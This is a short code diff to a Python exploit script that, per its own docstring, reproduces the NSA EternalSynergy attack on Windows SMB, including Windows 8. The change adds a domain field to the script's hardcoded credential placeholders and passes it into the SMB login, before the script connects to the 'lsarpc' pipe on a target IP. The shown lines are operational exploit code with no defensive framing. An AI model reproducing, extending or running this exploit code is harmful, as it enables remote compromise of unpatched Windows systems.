@@ -16,8 +16,9 @@ NSA eternalsynergy changes information leak method to exploit Windows 8 and Wind
 NSA eternalsynergy also do something to bypass NonpagedPoolNx. I do not check it.
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 2:
 	print("{} <ip>".format(sys.argv[0]))
@@ -28,7 +29,7 @@ pipe_name = 'lsarpc'
 
 
 conn = MYSMB(target)
-conn.login(USERNAME, PASSWORD)
+conn.login(USERNAME, PASSWORD, DOMAIN)
 
 smbConn = smbconnection.SMBConnection(target, target, existingConnection=conn, manualNegotiate=True)
 dce = transport.SMBTransport(target, filename=pipe_name, smb_connection=smbConn).get_dce_rpc()
